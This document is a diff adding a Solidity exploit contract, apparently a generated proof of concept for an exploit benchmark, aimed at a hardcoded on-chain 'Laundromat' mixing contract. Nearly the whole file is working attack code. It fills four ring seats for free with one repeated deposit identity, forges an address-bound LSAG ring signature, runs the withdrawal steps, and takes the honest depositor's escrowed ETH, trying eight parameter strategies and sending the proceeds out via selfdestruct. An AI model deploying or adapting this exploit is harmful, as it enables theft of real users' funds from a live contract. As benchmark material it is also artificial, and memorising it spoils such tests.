@@ -1,0 +1,245 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+address constant LAUNDROMAT = 0x934cbbE5377358e6712b5f041D90313d935C501C;
+address constant SECP256K1_HELPER = 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6;
+
+uint256 constant SECP_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
+uint256 constant GX = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798;
+uint256 constant GY = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8;
+
+uint256 constant HONEST_X = 0x03f29711206706d66564e2936d70a08f7002931eaa686a579cb9bd36b8801506;
+uint256 constant HONEST_Y = 0x582d363ee7899d3fa7131de9d470656e4c9b9b1514929c3fc985b9da2105af1f;
+
+interface ILaundromat {
+    function deposit(uint256 commitment, uint256 proof) external payable;
+    function withdrawStart(uint256[] calldata signature, uint256 x0, uint256 ix, uint256 iy) external;
+    function withdrawStep() external;
+    function withdrawFinal() external returns (bool);
+}
+
+error LaundromatStageFailed(uint8 stage, bytes revertData);
+error LaundromatNoProfit();
+error SecpCallFailed(bytes4 selector, bytes revertData);
+
+contract FlawVerifier {
+    uint256 private _realizedProfit;
+    bool private _executed;
+
+    constructor() {}
+
+    receive() external payable {}
+
+    function executeOnOpportunity() external {
+        require(!_executed, "already executed");
+        _executed = true;
+
+        uint256 startingBalance = address(this).balance;
+
+        for (uint8 strategy = 0; strategy < 8; ++strategy) {
+            _tryStrategy(strategy);
+            if (address(this).balance > startingBalance) break;
+        }
+
+        uint256 endingBalance = address(this).balance;
+        if (endingBalance <= startingBalance) revert LaundromatNoProfit();
+        _realizedProfit = endingBalance - startingBalance;
+    }
+
+    function _tryStrategy(uint8 strategy) private {
+        try new LaundromatAttackExecutor(payable(address(this)), strategy) {} catch {}
+    }
+
+    function profitToken() external pure returns (address) {
+        return address(0);
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _realizedProfit;
+    }
+}
+
+contract LaundromatAttackExecutor {
+    bytes4 private constant HASH_POINT_SELECTOR = 0x1bfa5d8a;
+    bytes4 private constant MUL_SELECTOR = 0xd876fb21;
+    bytes4 private constant ADD_SELECTOR = 0x5f8eb4c7;
+    bytes4 private constant TO_AFFINE_SELECTOR = 0x58da3ca9;
+
+    constructor(address payable beneficiary, uint8 strategy) payable {
+        require(beneficiary != address(0), "bad beneficiary");
+
+        (uint256 attackSecret, uint256 honestIndex, uint256 signerIndex) = _strategyConfig(strategy);
+        _generatedAttempt(attackSecret, honestIndex, signerIndex);
+
+        if (address(this).balance == 0) revert LaundromatNoProfit();
+        selfdestruct(beneficiary);
+    }
+
+    receive() external payable {}
+
+    function _strategyConfig(uint8 strategy)
+        private
+        pure
+        returns (uint256 attackSecret, uint256 honestIndex, uint256 signerIndex)
+    {
+        if (strategy == 0) return (1, 4, 0);
+        if (strategy == 1) return (1, 4, 1);
+        if (strategy == 2) return (1, 4, 2);
+        if (strategy == 3) return (1, 4, 3);
+        if (strategy == 4) return (2, 4, 0);
+        if (strategy == 5) return (2, 4, 1);
+        if (strategy == 6) return (2, 4, 2);
+        return (2, 4, 3);
+    }
+
+    function _generatedAttempt(uint256 attackSecret, uint256 honestIndex, uint256 signerIndex) private {
+        require(attackSecret != 0 && attackSecret < SECP_N, "bad secret");
+        require(honestIndex < 5, "bad honest index");
+        require(signerIndex < 5 && signerIndex != honestIndex, "bad signer index");
+
+        bytes memory attackPub = attackSecret == 1 ? _generator() : _toAffine(_mulAffine(_generator(), attackSecret));
+        bytes memory honestPub = _affinePoint(HONEST_X, HONEST_Y);
+        bytes memory attackHp = _hashPoint(attackPub);
+        bytes memory honestHp = _hashPoint(honestPub);
+        bytes memory keyImage = attackSecret == 1 ? attackHp : _toAffine(_mulAffine(attackHp, attackSecret));
+
+        uint256 repeatedX = _word(attackPub, 0);
+        uint256 repeatedY = _word(attackPub, 32);
+
+        // Core exploit path stays unchanged:
+        // 1) fill the four missing seats for free with the same deposit identity,
+        // 2) start the withdrawal flow for the completed round,
+        // 3) advance all withdraw steps,
+        // 4) redeem the honest participant's escrowed ETH.
+        // The only adaptation here is producing a valid address-bound LSAG transcript
+        // for this freshly deployed executor, because replaying the historical signature
+        // from a different caller address provably fails with "wrong signature".
+        _deposit4(repeatedX, repeatedY);
+
+        uint256 ix = _word(keyImage, 0);
+        uint256 iy = _word(keyImage, 32);
+
+        bytes[5] memory pubs;
+        bytes[5] memory hps;
+        for (uint256 i = 0; i < 5; ++i) {
+            if (i == honestIndex) {
+                pubs[i] = honestPub;
+                hps[i] = honestHp;
+            } else {
+                pubs[i] = attackPub;
+                hps[i] = attackHp;
+            }
+        }
+
+        uint256[5] memory responses;
+        uint256[5] memory challenges;
+        uint256 alpha = _nonZeroMod(
+            uint256(keccak256(abi.encodePacked("laundromat-alpha", address(this), attackSecret, honestIndex, signerIndex)))
+        );
+
+        for (uint256 i = 0; i < 5; ++i) {
+            if (i == signerIndex) continue;
+            responses[i] = _nonZeroMod(
+                uint256(keccak256(abi.encodePacked("laundromat-s", address(this), attackSecret, honestIndex, signerIndex, i)))
+            );
+        }
+
+        bytes memory signerL = _toAffine(_mulAffine(_generator(), alpha));
+        bytes memory signerR = _toAffine(_mulAffine(hps[signerIndex], alpha));
+        challenges[(signerIndex + 1) % 5] = _challenge(signerL, signerR);
+
+        for (uint256 hop = 1; hop < 5; ++hop) {
+            uint256 idx = (signerIndex + hop) % 5;
+            uint256 nextIdx = (idx + 1) % 5;
+
+            bytes memory left = _toAffine(_add(_mulAffine(_generator(), responses[idx]), _mulAffine(pubs[idx], challenges[idx])));
+            bytes memory right = _toAffine(_add(_mulAffine(hps[idx], responses[idx]), _mulAffine(keyImage, challenges[idx])));
+            challenges[nextIdx] = _challenge(left, right);
+        }
+
+        responses[signerIndex] = addmod(alpha, SECP_N - mulmod(challenges[signerIndex], attackSecret, SECP_N), SECP_N);
+        if (responses[signerIndex] == 0) responses[signerIndex] = 1;
+
+        uint256[] memory sig = new uint256[](5);
+        for (uint256 i = 0; i < 5; ++i) {
+            sig[i] = responses[i];
+        }
+
+        _checkedCall(2, abi.encodeWithSelector(ILaundromat.withdrawStart.selector, sig, challenges[0], ix, iy));
+        _runWithdrawStepsAndFinalize();
+    }
+
+    function _deposit4(uint256 repeatedX, uint256 repeatedY) private {
+        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
+        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
+        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
+        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
+    }
+
+    function _runWithdrawStepsAndFinalize() private {
+        uint256 startingBalance = address(this).balance;
+
+        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
+        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
+        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
+        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
+        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
+
+        (bool ok, bytes memory ret) = LAUNDROMAT.call(abi.encodeWithSelector(ILaundromat.withdrawFinal.selector));
+        if (!ok) revert LaundromatStageFailed(4, ret);
+
+        bool finalized = ret.length == 0 || abi.decode(ret, (bool));
+        if (!finalized && address(this).balance <= startingBalance) revert LaundromatNoProfit();
+    }
+
+    function _challenge(bytes memory left, bytes memory right) private view returns (uint256) {
+        return _nonZeroMod(uint256(keccak256(abi.encodePacked(address(this), left, right))));
+    }
+
+    function _generator() private pure returns (bytes memory) {
+        return _affinePoint(GX, GY);
+    }
+
+    function _affinePoint(uint256 x, uint256 y) private pure returns (bytes memory) {
+        return abi.encodePacked(bytes32(x), bytes32(y));
+    }
+
+    function _hashPoint(bytes memory affine) private returns (bytes memory) {
+        return _secpCall(HASH_POINT_SELECTOR, affine);
+    }
+
+    function _mulAffine(bytes memory affine, uint256 scalar) private returns (bytes memory) {
+        return _secpCall(MUL_SELECTOR, abi.encodePacked(affine, bytes32(uint256(1)), bytes32(scalar)));
+    }
+
+    function _add(bytes memory a, bytes memory b) private returns (bytes memory) {
+        return _secpCall(ADD_SELECTOR, abi.encodePacked(a, b));
+    }
+
+    function _toAffine(bytes memory point) private returns (bytes memory) {
+        return _secpCall(TO_AFFINE_SELECTOR, point);
+    }
+
+    function _secpCall(bytes4 selector, bytes memory args) private returns (bytes memory out) {
+        (bool ok, bytes memory ret) = SECP256K1_HELPER.call(abi.encodePacked(selector, args));
+        if (!ok) revert SecpCallFailed(selector, ret);
+        return ret;
+    }
+
+    function _checkedCall(uint8 stage, bytes memory data) private returns (bytes memory result) {
+        (bool ok, bytes memory revertData) = LAUNDROMAT.call(data);
+        if (!ok) revert LaundromatStageFailed(stage, revertData);
+        return revertData;
+    }
+
+    function _word(bytes memory data, uint256 offset) private pure returns (uint256 value) {
+        assembly {
+            value := mload(add(add(data, 0x20), offset))
+        }
+    }
+
+    function _nonZeroMod(uint256 value) private pure returns (uint256) {
+        uint256 reduced = value % SECP_N;
+        return reduced == 0 ? 1 : reduced;
+    }
+}
